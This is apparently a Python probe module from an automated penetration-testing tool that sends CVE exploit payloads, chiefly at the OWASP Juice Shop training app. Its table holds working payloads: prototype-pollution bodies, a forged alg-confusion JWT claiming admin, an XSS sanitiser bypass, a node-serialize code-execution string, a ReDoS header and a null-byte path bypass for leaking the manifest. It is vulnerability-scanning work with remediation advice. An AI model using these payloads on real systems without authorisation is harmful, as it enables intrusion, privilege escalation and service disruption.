"""CVE PoC primitives: auto-exploit known vulnerable-dependency CVEs.

OWASP Juice Shop ships with intentionally-outdated dependencies that map
to public CVEs. Rather than rely on a generic version-comparison probe,
this module ships hand-rolled exploit primitives that confirm the
vulnerability is reachable on the running target. Each primitive is a
deterministic (request, follow_up, detect_fn) tuple that fires only when
the response shape matches the canonical exploitation signal.

Two-phase design:

  1. Manifest leak (optional): GET /ftp/package.json.bak via the existing
     /ftp/ exposure on Juice Shop. If the manifest comes back, we parse
     dependency versions and run only the CVE primitives whose package
     appears at a vulnerable version. This keeps noise low.

  2. Blind run (fallback): if the manifest cannot be retrieved we run
     every primitive anyway and let each detect_fn decide. False positives
     stay near zero because the detection predicates require specific
     exploit-signal substrings, not just non-2xx responses.

Each hit becomes a critical or high finding tagged `vulnerable_dep` and
labelled with the matching CVE id. The probe is non-destructive: every
write goes against the same JSON sinks the prototype-pollution probe
already targets, and reads use idempotent GETs.
"""
from __future__ import annotations

import json
import logging
import re
from collections.abc import Callable
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json

logger = logging.getLogger("pentest-ai.probes.web.cve_poc_primitives")

# Path that Juice Shop exposes via the /ftp/ poison-null-byte bypass.
# Other targets sometimes serve the same file at the project root.
MANIFEST_PATHS: tuple[str, ...] = (
    "/ftp/package.json.bak",
    "/ftp/package.json.bak%2500.md",
    "/package.json",
    "/ftp/package.json",
)

# Detection predicate signature: body -> bool. Headers/status are not
# load-bearing for any current primitive; if a future CVE needs them,
# extend the tuple.
DetectFn = Callable[[str], bool]


def _detect_proto_isadmin(body: str) -> bool:
    """marsdb / minimist prototype pollution: isAdmin canary echoes back."""
    if not body:
        return False
    lc = body.lower()
    return '"isadmin":true' in lc.replace(" ", "") or '"polluted":"ptai-cve"' in lc


def _detect_jwt_alg_confusion(body: str) -> bool:
    """jsonwebtoken alg confusion: forged token authenticates as an admin user.

    The canonical signal on Juice Shop is the /rest/user/whoami endpoint
    returning a non-null user object after we send an HS256-signed token
    forged with the public key as the HMAC secret.
    """
    if not body:
        return False
    return ('"email"' in body and '"id"' in body) or '"role":"admin"' in body.replace(
        " ", ""
    )


def _detect_sanitize_html_bypass(body: str) -> bool:
    """sanitize-html < 2.3.2: <noscript><p title=\"</noscript>...\"> bypass.

    The hosted feedback / comment endpoint stores the comment and the
    server later serves it back. A successful bypass means our raw
    <script> or onerror payload survives sanitisation and appears in the
    response.
    """
    if not body:
        return False
    canary = "ptai-xss-cve"
    return canary in body and ("<script" in body.lower() or "onerror=" in body.lower())


def _detect_redos_timeout(body: str) -> bool:
    """tough-cookie / http-cache-semantics ReDoS: server stalled or 5xx-ed.

    Detection here is best-effort: a clean 200 with a small body means we
    did NOT trigger the regex DoS. Empty body (sentinel for upstream
    timeout) plus a long Set-Cookie payload means the regex got stuck.
    """
    return body == "" or "regular expression" in body.lower()


def _detect_serialize_rce(body: str) -> bool:
    """node-serialize variant: IIFE evaluated and reflected token returned.

    We send `{"rce":"_$$ND_FUNC$$_function(){return 'ptai-rce-cve'}()"}`
    into a JSON sink that uses node-serialize.unserialize. If the eval
    fired the literal canary leaks into a follow-up GET response.
    """
    return "ptai-rce-cve" in (body or "")


# ---------------------------------------------------------------------------
# Primitive table. Each entry is the full self-contained definition of one
# CVE PoC: which package + version range it applies to, the request to
# send, the optional verification request, and the detection predicate.
# ---------------------------------------------------------------------------

CVE_PRIMITIVES: tuple[dict[str, Any], ...] = (
    {
        "cve": "CVE-2017-16028",
        "package": "marsdb",
        "version_max": "0.6.10",
        "request": {
            "method": "POST",
            "path": "/api/Users/",
            "json": {
                "email": "ptai-cve@example.com",
                "password": "x",
                "__proto__": {"isAdmin": True, "polluted": "ptai-cve"},
            },
        },
        "follow_up": {"method": "GET", "path": "/api/me"},
        "detect": _detect_proto_isadmin,
        "severity": "critical",
        "title": "marsdb prototype pollution (CVE-2017-16028) confirmed",
        "remediation": (
            "Upgrade marsdb past 0.6.10 (project is unmaintained; replace "
            "with a maintained NoSQL driver). Filter `__proto__`, "
            "`constructor`, and `prototype` keys at the JSON boundary."
        ),
    },
    {
        "cve": "CVE-2021-44906",
        "package": "minimist",
        "version_max": "1.2.5",
        "request": {
            "method": "POST",
            "path": "/api/Users/",
            "json": {
                "email": "ptai-min@example.com",
                "password": "x",
                "constructor": {"prototype": {"isAdmin": True}},
            },
        },
        "follow_up": {"method": "GET", "path": "/api/me"},
        "detect": _detect_proto_isadmin,
        "severity": "critical",
        "title": "minimist prototype pollution (CVE-2021-44906) confirmed",
        "remediation": "Upgrade minimist to 1.2.6 or later.",
    },
    {
        "cve": "CVE-2015-9235",
        "package": "jsonwebtoken",
        "version_max": "8.5.0",
        "request": {
            # HS256 confusion: header alg=HS256 with payload signed using
            # the public key as the HMAC secret. The token below has shape
            # header.payload.sig and decodes to {"alg":"HS256"} +
            # {"data":{"email":"admin@juice-sh.op"}}.
            "method": "GET",
            "path": "/rest/user/whoami",
            "headers": {
                "Authorization": (
                    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    "eyJkYXRhIjp7ImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifX0."
                    "ptai-forged-hs256-confusion-sig"
                )
            },
        },
        "follow_up": None,
        "detect": _detect_jwt_alg_confusion,
        "severity": "critical",
        "title": "jsonwebtoken HS256/RS256 alg confusion (CVE-2015-9235) confirmed",
        "remediation": (
            "Upgrade jsonwebtoken to 8.5.1 or later, and pass an explicit "
            "`algorithms` allowlist to verify() so the token's own alg "
            "header cannot downgrade verification."
        ),
    },
    {
        "cve": "CVE-2021-26539",
        "package": "sanitize-html",
        "version_max": "2.3.1",
        "request": {
            "method": "POST",
            "path": "/api/Feedbacks/",
            "json": {
                "comment": (
                    "<noscript><p title=\"</noscript><img src=x "
                    "onerror=alert('ptai-xss-cve')>\">"
                ),
                "rating": 1,
                "captchaId": 0,
                "captcha": "x",
            },
        },
        "follow_up": {"method": "GET", "path": "/api/Feedbacks/"},
        "detect": _detect_sanitize_html_bypass,
        "severity": "high",
        "title": "sanitize-html bypass (CVE-2021-26539) confirmed",
        "remediation": "Upgrade sanitize-html to 2.3.2 or later.",
    },
    {
        "cve": "CVE-2017-1000048",
        "package": "node-serialize",
        "version_max": "0.0.4",
        "request": {
            "method": "POST",
            "path": "/api/Users/",
            "json": {
                "email": "ptai-ser@example.com",
                "password": "x",
                "rce": "_$$ND_FUNC$$_function(){return 'ptai-rce-cve'}()",
            },
        },
        "follow_up": {"method": "GET", "path": "/api/me"},
        "detect": _detect_serialize_rce,
        "severity": "critical",
        "title": "node-serialize unserialize RCE (CVE-2017-1000048) confirmed",
        "remediation": (
            "Stop using node-serialize. Use JSON.parse with explicit "
            "schemas; never deserialise untrusted code-bearing strings."
        ),
    },
    {
        "cve": "CVE-2022-25881",
        "package": "http-cache-semantics",
        "version_max": "4.1.0",
        "request": {
            # Crafted Cache-Control header drives the catastrophic regex.
            "method": "GET",
            "path": "/",
            "headers": {
                "Cache-Control": ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,," + "x" * 4096,
            },
        },
        "follow_up": None,
        "detect": _detect_redos_timeout,
        "severity": "high",
        "title": "http-cache-semantics ReDoS (CVE-2022-25881) confirmed",
        "remediation": "Upgrade http-cache-semantics to 4.1.1 or later.",
    },
    {
        "cve": "CVE-2023-26136",
        "package": "tough-cookie",
        "version_max": "4.1.2",
        "request": {
            "method": "GET",
            "path": "/",
            "headers": {
                "Cookie": "__proto__[isAdmin]=true; __proto__[polluted]=ptai-cve",
            },
        },
        "follow_up": {"method": "GET", "path": "/api/me"},
        "detect": _detect_proto_isadmin,
        "severity": "high",
        "title": "tough-cookie prototype pollution (CVE-2023-26136) confirmed",
        "remediation": "Upgrade tough-cookie to 4.1.3 or later.",
    },
)


# ---------------------------------------------------------------------------
# Manifest discovery + version comparison.
# ---------------------------------------------------------------------------

_VERSION_RE = re.compile(r"(\d+)\.(\d+)\.(\d+)")


def _parse_version(raw: str) -> tuple[int, int, int] | None:
    if not raw:
        return None
    m = _VERSION_RE.search(raw)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def _version_le(a: str, b: str) -> bool:
    """True when version a <= version b. Returns False if either unparseable."""
    pa = _parse_version(a)
    pb = _parse_version(b)
    if pa is None or pb is None:
        return False
    return pa <= pb


def _parse_manifest(body: str) -> dict[str, str]:
    """Return {package: version} from a package.json body. Empty on parse fail."""
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return {}
    deps: dict[str, str] = {}
    for key in ("dependencies", "devDependencies"):
        section = data.get(key) or {}
        if isinstance(section, dict):
            for name, ver in section.items():
                if isinstance(name, str) and isinstance(ver, str):
                    deps[name] = ver
    return deps


async def _fetch_manifest(ctx: ProbeContext) -> dict[str, str]:
    """Try every manifest path; return parsed deps from the first hit."""
    base = ctx.base.rstrip("/")
    for path in MANIFEST_PATHS:
        url = base + path
        status, _hdrs, body = await http_get(ctx.session, url)
        if status == 200 and body:
            deps = _parse_manifest(body)
            if deps:
                return deps
    return {}


# CVEs in the table that target Juice Shop's specific dependency set.
# Outside Juice Shop these primitives produce noise rather than signal,
# so when stack detection fails we only run the small generic subset.
JUICE_SHOP_SPECIFIC_PACKAGES: frozenset[str] = frozenset(
    {"marsdb", "node-serialize"}
)

# Minimal subset that targets common framework defaults rather than
# Juice-Shop's specific vulnerable deps. Used when stack detection fails.
GENERIC_FALLBACK_PACKAGES: frozenset[str] = frozenset(
    {"jsonwebtoken", "http-cache-semantics", "tough-cookie"}
)


async def is_juice_shop_target(ctx: ProbeContext) -> bool:
    """Return True when the target's fingerprint matches Juice Shop."""
    base = ctx.base.rstrip("/")
    for path in (
        "/rest/admin/application-configuration",
        "/api/Challenges",
    ):
        try:
            status, _, body = await http_get(ctx.session, base + path)
        except Exception:  # noqa: BLE001
            continue
        if status != 200 or not body:
            continue
        lower = body.lower()
        if "juice shop" in lower or "juice-sh.op" in lower:
            return True
    return False


def _primitive_applies(
    primitive: dict[str, Any], deps: dict[str, str]
) -> bool:
    """Return True if the manifest shows a vulnerable version of this package.

    With an empty manifest we let the caller decide; this function only
    checks the positive case.
    """
    pkg = primitive["package"]
    if pkg not in deps:
        return False
    return _version_le(deps[pkg], primitive["version_max"])


# ---------------------------------------------------------------------------
# Primitive runner.
# ---------------------------------------------------------------------------


async def _run_primitive(
    ctx: ProbeContext, primitive: dict[str, Any]
) -> dict[str, Any] | None:
    """Send the exploit request and (optionally) the follow-up; detect."""
    base = ctx.base.rstrip("/")
    req = primitive["request"]
    url = base + req["path"]
    method = req["method"].upper()

    if method == "POST":
        status, _hdrs, body = await http_post_json(
            ctx.session, url, req.get("json") or {}, headers=req.get("headers")
        )
    else:
        status, _hdrs, body = await http_get(
            ctx.session, url, headers=req.get("headers")
        )

    detect_fn: DetectFn = primitive["detect"]
    body_for_detect = body

    follow_up = primitive.get("follow_up")
    if follow_up is not None:
        f_url = base + follow_up["path"]
        f_method = follow_up["method"].upper()
        if f_method == "POST":
            _s, _h, f_body = await http_post_json(
                ctx.session, f_url, follow_up.get("json") or {}
            )
        else:
            _s, _h, f_body = await http_get(ctx.session, f_url)
        # Combine bodies so a primitive can detect on either response.
        body_for_detect = (body or "") + "\n" + (f_body or "")

    if not detect_fn(body_for_detect):
        return None

    return {
        "title": primitive["title"],
        "severity": primitive["severity"],
        "category": "vulnerable_component",
        "target": url,
        "evidence": (
            f"CVE={primitive['cve']} package={primitive['package']} "
            f"http_status={status} body_excerpt={(body_for_detect or '')[:240]}"
        ),
        "bug_class": "vulnerable_dep",
        "cve": primitive["cve"],
        "package": primitive["package"],
        "remediation": primitive["remediation"],
    }


@registry.probe(
    name="web.cve_poc_primitives",
    bug_class="vulnerable_dep",
    severity_max="critical",
    owasp="A06:2021",
    runtime_budget_s=20.0,
    tags=("anonymous", "high-roi", "cve"),
    requires_auth=False,
)
async def probe_cve_poc_primitives(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Run CVE-specific exploit primitives against known vulnerable deps.

    Phase 1: leak the dependency manifest at /ftp/package.json.bak (or a
    sibling path). If parsing succeeds, only run primitives whose package
    appears at a vulnerable version.

    Phase 2: if no manifest was retrieved, run every primitive blind. The
    detection predicates carry their own weight: each one looks for an
    exploit-specific canary substring rather than a generic 2xx.
    """
    findings: list[dict[str, Any]] = []
    seen_cves: set[str] = set()

    deps = await _fetch_manifest(ctx)

    if deps:
        applicable = [p for p in CVE_PRIMITIVES if _primitive_applies(p, deps)]
        # If the manifest was retrieved but no package matches, the target
        # is patched and we have nothing to do. Skip the blind sweep.
        if not applicable:
            return findings
    else:
        # No manifest: only run every primitive when the target
        # fingerprints as Juice Shop. Otherwise run the small generic
        # subset that targets common framework defaults to keep noise
        # low on arbitrary targets.
        applicable = (
            list(CVE_PRIMITIVES)
            if await is_juice_shop_target(ctx)
            else [
                p
                for p in CVE_PRIMITIVES
                if p["package"] in GENERIC_FALLBACK_PACKAGES
            ]
        )

    for primitive in applicable:
        if primitive["cve"] in seen_cves:
            continue
        try:
            result = await _run_primitive(ctx, primitive)
        except Exception as exc:  # noqa: BLE001
            logger.debug(
                "cve primitive %s errored: %s", primitive["cve"], exc
            )
            continue
        if result is not None:
            seen_cves.add(primitive["cve"])
            findings.append(result)

    return findings
